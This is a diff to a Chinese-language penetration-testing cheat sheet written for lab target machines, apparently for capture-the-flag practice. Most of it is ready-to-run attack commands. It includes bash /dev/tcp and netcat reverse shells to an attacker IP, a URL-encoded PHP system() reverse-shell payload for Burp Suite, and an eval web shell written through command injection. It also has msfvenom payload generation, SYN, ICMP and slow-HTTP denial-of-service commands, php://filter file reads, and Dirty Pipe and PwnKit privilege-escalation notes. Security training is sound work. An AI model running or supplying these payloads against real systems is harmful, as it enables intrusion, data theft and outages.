@@ -194,6 +194,9 @@ ssh相比反弹shell更稳定，ssh流量加密
 解压：`unzip 文件名.zip`
 看目录列表：`unzip -l respectmydrip.zip`或更相信`zipinfo respectmydrip.zip`
 
+### 2.11.4 zlib
+解压：`zlib-flate -uncompress < 压缩包名.zlib > unzipped_data`
+
 # 三、渗透工具
 ## 3.1 arp-scan
 `sudo arp-scan -l`
@@ -384,8 +387,16 @@ fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u target.zip
 `sudo apt update && sudo apt install stegseek`
 爆破：`stegseek [图片名] /usr/share/wordlists/rockyou.txt`
 
-## 3.10 metasploit-framework
-### 3.10.1 密码爆破例子
+## 3.10 逆向与提取工具
+### 3.10.1 Binwalk
+```ZSH
+binwalk -e .cypher-neo.png --run-as=root
+```
+  - `-e`是`--extract`的缩写
+  - `--run-as=root`以root权限进行提取操作，如果不加这个参数，却又是root身份，`binwalk`可能拒绝执行
+
+## 3.11 metasploit-framework
+### 3.11.1 密码爆破例子
 ```ZSH
 msfconsole
 search tomcat login
@@ -394,14 +405,14 @@ set RHOSTS <靶机IP>
 exploit
 ```
 
-### 3.10.2 反弹shell例子
+### 3.11.2 反弹shell例子
 ```ZSH
 攻击机：msfvenom -p java/shell_reverse_tcp LHOST=<攻击机IP> LPORT=<监听端口> -f war > shell.war
 攻击机：nc -lvvp <监听端口>
 ```
 
-## 3.11 Dos攻击
-### 3.11.1 DDos攻击（桥接模式+关闭防火墙）
+## 3.12 Dos攻击
+### 3.12.1 DDos攻击（桥接模式+关闭防火墙）
 **Tcp syn DDos攻击**
 
 ```ZSH
@@ -442,7 +453,7 @@ hping3 --icmp --flood --rand-source -d 1000 172.31.132.2
   3. 计算带宽：$10,000 \text{ pps} \times 160 \text{ Bytes} \times 8 \text{ bits/byte} = 12,800,000 \text{ bps}$
   4. 结果：约12.8Mbps
 
-### 3.11.2 HTTP Dos慢速连接攻击
+### 3.12.2 HTTP Dos慢速连接攻击
 ```ZSH
 slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://[指定IP]:[指定端口] -x 10 -p 3
 ```
@@ -455,14 +466,28 @@ slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u
   - `-x`为随访数据的最大长度
   - `-p`秒，为等待探针连接上的HTTP响应超时，之后服务器被视为不可访问
 
-### 3.11.3不完整的HTTP请求Dos攻击
+### 3.12.3不完整的HTTP请求Dos攻击
 ```ZSH
 slowloris [指定IP] -p [指定端口] -s 1000
 ```
   - `-s`指定连接数
+
+## 3.13 利用 Python 开临时 web 服务器 {#http.server}
+```bash
+# 如果靶机是 python3
+python3 -m http.server 8080
+
+# 如果靶机只有 python2
+python -m SimpleHTTPServer 8080
+
+# 本地kali
+wget http://靶机IP:8080/文件名.后缀
+```
+
 # 四、Payload分析
 ## 4.1 反弹shell {#revshell}
 ### 4.1.1 bash反弹
+#### 4.1.1.1 命令窗口
 ```ZSH
 bash -i >& /dev/tcp/攻击机IP/7777 0>&1
 ```
@@ -477,6 +502,12 @@ bash -i >& /dev/tcp/攻击机IP/7777 0>&1
 
 这里需要kali先监听`7777`端口
 
+#### 4.1.1.2 burp suite中构造
+```ZSH
+message=<?php system("bash -c 'bash -i >%26 /dev/tcp/你的Kali_IP/4444 0>%261'"); ?>&file=reverse.php
+```
+  - 其中`%26`是`&`
+
 ### 4.1.2 反弹shell URL版本
 ```ZSH
 http://攻击机IP/site/busque.php?buscar=nc%20-e%20/bin/bash%20靶机IP%205555
@@ -488,7 +519,7 @@ nc -lvnp 5555
 
 ### 4.1.3 一句话木马传入`shell.php`
 ```ZSH
-http://靶机ip/site/busque.php?buscar=echo '<?php eval($_POST["cmd"]); ?>' > shell.php
+http://靶机ip/site/busque.php?buscar=echo '<?php eval($_POST["cmd"]);?>' > shell.php
 ```
   - 这里的`/site/busque.php?buscar=`是靶机网站自带的
   - `<?php ... ?>`是php代码开始和结束标记
@@ -565,9 +596,21 @@ root shell 接管当前终端
 4. 靶机上：`export TERM=xterm` (开启完整显示支持)。
 5. 靶机上：`reset` (刷新显示)。
 
+  - `pty`是 python 自带的模块，能向 linux 内核申请创建一个新的伪终端设备对。
+  - `spawn`，其中`spawn`的意思是“孵化”，它会让`pty`模块在后台切断原本死板的网络管道，创建一个真正的虚拟终端（TTY），然后在这个新终端启动`/bin/bash`
   - `stty raw`进入原始模式，所有键盘输入(ctrl+c,tab)都不由本地系统处理，而是直接通过网络发送
   - `-echo`禁止本地回显，不然输入字符，本地显示一次，远程传回字符显示一次
   - `; fg`把挂起的反弹shell切回前台
+
+## 4.4 伪协议
+```
+php://filter/read=convert.base64-encode/resource=graffiti.php
+
+php://filter / read=convert.base64-encode / resource=graffiti.php
+  └────┬─────┘   └──────────┬───────────┘   └──────────┬─────────┘
+    协议头/通道         过滤器(核心操作)               目标文件
+```
+
 
 # 五、权限
 ## 5.1 权限划分
@@ -650,3 +693,17 @@ Linux 的文件权限通常由 10 位字符表示（例如`-rwxrwxrwx`），这 
     - Docker组：如果在`docker`组，可以运行`docker run -v /:/mnt --rm -it alpine chroot /mnt`直接挂载整个物理根目录
     - LXD组：通过挂载镜像的方式获取物理机root权限
 
+### 6.2.3 常用提权CVE
+1. CVE-2022-0847-Dirty Pipe
+影响范围：`5.8 <= Linux Kernel < 5.16.11 / 5.15.25 / 5.10.102`
+原理：由于内核管道缓存中的标志位未初始化，允许攻击者向任意只读文件中写入数据
+利用方式：直接修改`/etc/passwd`，将root密码改掉，或把当前低权限用户改为UID 0
+
+2. CVE-2021-4034-PwnKit
+影响范围：主流 Linux发行版自2009年以来的所有版本
+原理：不是内核漏洞，而是Linux默认自带的系统组件Polkit中的`pkexec`命令存在参数配置不当导致的内存越界权限提升
+利用方式：即使`pkexec`没有设置SUID，也能通过构造特殊的恶意外环境变量一键获取root
+
+### 6.2.4 常用提权辅助脚本
+1. PEASS-ng(LinPEAS)
+运行 linpeas.sh
